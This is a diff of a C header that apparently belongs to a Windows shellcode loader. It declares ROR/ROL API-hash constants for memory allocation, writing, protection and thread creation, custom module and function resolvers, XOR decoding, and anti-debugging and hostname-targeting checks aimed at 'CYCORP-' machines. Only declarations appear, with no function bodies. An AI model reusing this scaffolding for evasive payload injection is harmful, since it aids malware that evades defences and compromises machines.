@@ -6,45 +6,10 @@
 #include <stdint.h>
 
 
-#define HOSTNAME_PREFIX "CYCORP-"
-#define DEBUG_MODE 1
-
-
-#define NTDLL_HASH 0x69e00346   // ROL17
-#define KERNEL32_HASH 0x79e0c5e8 // ROL17
-
-#define QUERY_INFORMATION_PROCESS_HASH 0xcfb70e4c // A:0x7091eca7 // ROR23
-#define GET_COMPUTER_NAME_HASH 0xcfb6e24c // ROR23
-#define VIRTUAL_ALLOC_HASH 0x96124679 // ROR23 NtAllocateVirtualMemory
-#define WRITE_MEMORY_HASH 0x92136911 // ROR23
-#define VIRTUAL_PROTECT_HASH 0xd62f6483 // ROR23
-#define CREATE_THREAD_HASH 0xdd007761 // ROR23
-#define WAIT_FOR_SINGLE_OBJECT_HASH 0xde23aac9 // ROR23
-
-
-
-void XOR(unsigned char *data, size_t len, WORD key);
-
-HMODULE CustomGetModuleHandle(unsigned int module_hash);
-FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash);
-
-uint8_t is_being_debugged();
-// BYTE is_being_debugged_alternative();
-// int d();
-int get_disk_size();
-const char* get_hostname(HMODULE hNtdll);
-int starts_with(const char* str, const char* prefix);
-// char* c();
-
-int divide(int a, int b);
-int multiply(int a, int b);
-int add(int a, int b);
-int substract(int a, int b);
-
 typedef enum { false, true } bool;
 
 typedef struct {
-    unsigned int hash;
+    unsigned int value;
     uint8_t rotation_value;
     bool is_rotation_right;
 } FctHash;
@@ -98,5 +63,38 @@ typedef BOOL(WINAPI* GetComputerNameFunc)(
     LPSTR lpBuffer,
     LPDWORD lpnSize
 );
+
+extern FctHash NTDLL_HASH;
+extern FctHash KERNEL32_HASH;
+
+extern FctHash QUERY_INFORMATION_PROCESS_HASH;
+extern FctHash GET_COMPUTER_NAME_HASH;
+extern FctHash VIRTUAL_ALLOC_HASH;
+extern FctHash WRITE_MEMORY_HASH;
+extern FctHash VIRTUAL_PROTECT_HASH;
+extern FctHash CREATE_THREAD_HASH;
+extern FctHash WAIT_FOR_SINGLE_OBJECT_HASH;
+
+#define HOSTNAME_PREFIX "CYCORP-"
+#define DEBUG_MODE 1
+
+
+void XOR(unsigned char *data, size_t len, uint16_t key);
+
+HMODULE CustomGetModuleHandle(FctHash module_hash);
+FARPROC CustomGetProcAdress(IN HMODULE hModule, FctHash function_hash);
+
+uint8_t is_being_debugged();
+// BYTE is_being_debugged_alternative();
+// int d();
+int get_disk_size();
+const char* get_hostname(HMODULE hNtdll);
+int starts_with(const char* str, const char* prefix);
+// char* c();
+
+int divide(int a, int b);
+int multiply(int a, int b);
+int add(int a, int b);
+int substract(int a, int b);
 
 #endif // CONFIG_H
